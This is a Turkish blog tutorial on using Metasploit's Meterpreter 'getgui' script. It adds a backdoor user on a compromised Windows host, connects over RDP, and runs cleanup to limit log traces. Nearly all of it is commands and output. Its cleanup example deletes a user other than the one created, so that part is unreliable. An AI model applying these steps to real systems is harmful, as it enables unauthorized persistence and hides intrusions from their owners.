---
title: MSF Remote Desktop Modülü
layout: post
date: 2017-06-05 09:05:06.000000000 +02:00
type: post
author: siberoloji
img: metasploit.jpg
published: true
status: publish
categories:
- Nasıl
- Araştırma
tags:
- msfconsole
- metasploit getgui script
- Metasploit Framework getgui
- msf rdesktop
excerpt: Metasploit Framework içerisinde Meterpreter ile bir shell açtığınızda yapılabilecek işlemlerden bir tanesi de uzak masaüstü bağlantısını hayata geçirmek olabilir. Bunun için ```getgui``` komutu oldukça kullanışlıdır.
---

Metasploit Framework içerisinde Meterpreter ile bir shell açtığınızda yapılabilecek işlemlerden bir tanesi de uzak masaüstü bağlantısını hayata geçirmek olabilir. Bunun için ```getgui``` komutu oldukça kullanışlıdır.

Bu yazımızda ```getgui``` komutunu kullanarak sistemde bir kullanıcı oluşturup ardından ```rdesktop``` komutu ile bu bilgisayara nasıl bağlanabileceğimizi göreceğiz.

# Uzak Masaüstü Bağlantısı

Hedef bilgisayarda Meterpreter shell açtığınızı varsayıyoruz. Şimdi işe ```getgui``` komutunu kullanarak görsel bağlantı sağlamak için gerekli olan kullanıcı adı ve parolaya ihtiyacımız var. Böyle bir kullanıcı adı ve parolası oluşturduğunuzda kalıcılık sağlamış olursunuz.

## ```getgui``` Aracı

Öncelikle ```getgui``` yardım başlıklarına bakalım.

```sh
meterpreter > run getgui -h
Windows Remote Desktop Enabler Meterpreter Script
Usage: getgui -u  -p 
Or:    getgui -e

OPTIONS:

    -e   Enable RDP only.
    -f   Forward RDP Connection.
    -h   Help menu.
    -l   The language switch
         Possible Options: 'de_DE', 'en_EN' / default is: 'en_EN'
    -p   The Password of the user
```
## ```getgui``` Kullanıcı Ekleme

Genel olarak kullanımda ```-u``` kullanıcı adını, ```-p``` parolayı belirtmek için kullanılır. ```getgui``` komutunu aşağıdaki örneğe benzer şekilde kullandığınızda sisteme yeni bir kullanıcı eklemiş olursunuz. 

```sh
meterpreter > run getgui -u loneferret -p password
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Language detection started
[*]   Language detected: en_US
[*] Setting user account for logon
[*]   Adding User: loneferret with Password: password
[*]   Adding User: loneferret to local group ''
[*]   Adding User: loneferret to local group ''
[*] You can now login with the created user
[*] For cleanup use command: run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
meterpreter >
```

## ```rdesktop``` Bağlantısı

Artık kullanıcı oluşturuldu. Aynı ağda bulunan başka bir bilgisayardan, bu kullanıcı adı ve parolayı kullanarak uzak masaüstü bağlantısı yapabilirsiniz. 

```sh
root@kali:~#: rdesktop -u loneferret -p password 192.168.101.108
```

# Log Temizleme

Hedef sistemde ne kadar çok oynama yaparsanız, log kayıtlarına kaydedilme ihtimaliniz de o kadar artar. Bu sebeple mümkün olduğunca yetkisiz işlem yapmamalı veya gereken yerlere müdahale etmekle yetinmelisiniz. 

```getgui``` ile oluşturduğunuz kullanıcı ve oturum bilgilerini log kayıtların temizlemek isteyebilirsiniz. Bunun için aşağıdaki komut örneği işinize yarayacaktır. Örnekte kullanılan ```/root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc``` dosyasının en güncel halini yine aynı klasör içinden kontrol edebilirsiniz. 

```sh
meterpreter > run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
[*] Running Command List ...
[*]   Running command execute -H -f cmd.exe -a "/c net user hacker /delete"
Process 288 created.
meterpreter >
```